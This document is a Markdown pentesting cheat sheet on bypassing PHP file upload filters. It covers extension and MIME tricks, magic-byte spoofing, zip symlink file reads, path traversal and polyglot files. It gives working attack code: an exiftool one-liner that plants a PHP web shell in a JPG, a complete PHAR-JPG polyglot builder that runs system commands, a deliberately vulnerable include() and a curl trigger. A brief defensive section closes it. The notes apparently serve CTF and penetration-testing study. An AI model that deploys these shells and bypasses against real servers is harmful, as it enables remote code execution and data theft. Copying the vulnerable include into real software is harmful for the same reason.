# File Upload


> [!Warning] Filenames 
> Errors can appears if a file having the same name that the uploaded file already exists on the target directory

# Extensions

- Using double encoding such as `img.jpg.php`
- Using derivative extensions such as `php3`, `php4`, `php5`, `php7`, `phps`, `php-s`, `pht`, `phtml` `phar`
- Using a NULL such as `.php%00.jpg`

> [!Warning] NULL byte
> The NULL byte tricks will not work on recent PHP versions

# MIME Type

> When uploading a file, its MIME Type tells to the server what's inside the uploaded file.
> Some filters are MIME Type based

- This MIME Type can be edited through BurpSuite

> [!NOTE] Common MIME Types
> - `text/plain`
> - `application/x-httpd-php`
> - `application/json`
> - `image/jpeg`
> - `image/png`
> - `text/javascript`
> - [MIME Types documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types)

# File content

> You can use built-in PHP methods such as `getimagesize()` to ensure that the content of the uploaded file is actually a legit image


> [!NOTE] File content bypass
> - Some files can be a valid image (e.g. valid `.jpg`) but a valid `.php` at the same time
> - Go to the **Polyglot** section


# Magic Numbers

> [!NOTE] Magic Numbers
> Magic numbers are the very first bytes of a file. They define what is the file purpose.
> *Example : PNGs files always starts with `89 50 4E 47 0D 0A 1A 0A` *
> - [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

**How to proceed**
1. Choose the signature you want to mimic
2. Open the file in a text editor and add as many `A` as signature bytes
3. Open the file with `hexeditor` and edit the first bytes with the custom MIME Type

# Zip upload

> [!NOTE] Unsecure deflation
> When ZIPs are decompressed in the back-end and the decompression is unsecure, ou can upload an archive containing symlinks
> So, when the archive is decompressed, it keeps Unix symlinks, leading to information disclosure
> Note that you will need a read access on uploaded file after it has been uploaded

```bash
# In this scenario, I could upload ZIP and the uncompressed files are visible at /uploads/<zipfilename>/<filenames>
ln -s ../../index.php symindex.txt    # You want to read /index.php 
zip --symlinks test.zip symindex.txt  # Compress the archive with symlinks conservation
# upload the `test.txt` archive
# Go to /uploads/test.zip/symindex.txt
```


> [!Tips] Tips
> - The last extension is the understood one

# Path traversal

- The filename can be edited through BurpSuite to start with a relative path


> [!NOTE] Path traversal
> - In BurpSuite, rename `shell.php` to `../../shell.php` to upload it in the relative directory 
> - This will require a vulnerable file upload back-end, of course

# Polyglot files

> _“In computing, a polyglot is a computer program or script written in a valid form of multiple programming languages, which performs the same operations or output independent of the programming language used to compile or interpret it.”_

Ref : [http://php.net/manual/en/function.exif-imagetype.php](http://php.net/manual/en/function.exif-imagetype.php)

#### HTACCESS x XBM

> `.xbm` format is interesting because 
> 1.  It is interpreted as an image
> 2. The first two lines define height and width and start with `#` which is the `.htaccess` comment character

**`.xbm` x `.htaccess` example**
```bash
#define test_width 1337
#define test_height 1337
<Files ".htaccess">
    Require all granted
</Files>
```

#### JPG x PHP

> You can hide a php script in the jpg comments

```bash
exiftool -command='<?php echo system($_GET["cmd"]); ?>' pic.jpg
mv pic.jpg pic.php
```

#### JPG x PHAR `include()`

> PHAR files work like ZIP files, when you can use the `phar://` to access files stored inside them.
> Here is a way to bypass `.jpg` upload when you can `include(phar://custom.jpg/test.txt)`


> [!NOTE] Access
> - Using `include('phar://foobar.jpg/text.txt')` wrapper
> - Using `include('php://filter/resource=phar://archive.jpg/text.txt')` wrapper

> [!NOTES] PHAR format specifications
> - **Stub section** : the stub is a chunk of PHP code which is executed when the file is accessed in an executable context. At a minimum, the stub must contain `__HALT_COMPILER();` at its conclusion.
> - **Manifest :** Contains metadata about the archive
> - **File contents :** Contains actual files in the archive
> - **Signature (optional) :** for verifying archive integrity

> As the stub section as no specification else than end with `__HALT_COMPILER();` we can start the file with anything we want such as `.jpg` headers !

`build_archive.php`
```php
<?php

 $jpeg_header_size =
"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13".
"\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02".
"\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15".
"\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
"\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01".
"\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03".
"\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11".
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
"\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda".
"\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9";

 error_reporting(E_ALL);

 $phar = new Phar("archive.phar");
 $phar->startBuffering();
 $phar->addFromString("test.txt",'<?php echo system("id"); ?>');
 $phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");
 $phar->stopBuffering();

?>
```

**Generate the archive**
```bash
php --define phar.readonly=0 build_archive.php
```

**Vulnerable code**
`read.php`
```php
<?php include("phar://" . $_GET['page']); ?>
```

**Trigger the payload**
```bash
php -S localhost:80
curl http://localhost/read.php?page=phar://archive.phar/test.txt
```

> [!NOTE] Other polyglots
> - `.phar`x`.jpg` : https://github.com/kunte0/phar-jpg-polyglot
> - https://www.nc-lp.com/blog/disguise-phar-packages-as-images


#### JPG x PHAR (`Deserialization`)

> [!NOTE] Access
> - Using `file_exists('phar://foobar.jpg')` wrapper
> - Using `file_get_contents('php://filter/resource=phar://foobar.jpg')` wrapper
> - To trigger `phar` deserialization, you should call a function that deals with files such as `file_exists('phar://phar.jpg)`,`file_get_contents()`, ...
> - https://ctftime.org/writeup/22612


# Solution : Do not allow to read files

From the web admin view, the most secure way to handle file upload is to upload the file to a non web readable folder (e.g. do not allow the user to read `/uploads/`)

> [!NOTE] Implementations
> - This can be done using `.htaccess` configuration
> - This can be done uploading to a non web folder (e.g. `/tmp/uploads`) and use the PHP `readfile()` method to return the content of the file
> - Randomize filenames and keep tracks of the default name a database 

> [!Warning] Local File Inclusion
> If you are pushing the second possibility in production, be careful to not implement a *Local File Inclusion* vulnerability


# Resources

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- [http://php.net/manual/en/function.exif-imagetype.php](http://php.net/manual/en/function.exif-imagetype.php)
- https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf?_gl=1*g0yg09*_ga*MTYxMDQ3MzgyMC4xNzE4MzU2NTIx*_ga_SRYSKX09J7*MTcyMTIzNDg5MS42Mi4xLjE3MjEyMzQ5MzEuMC4wLjA.

# Resources (polyglot files)

- https://vickieli.dev/hacking/polyglot/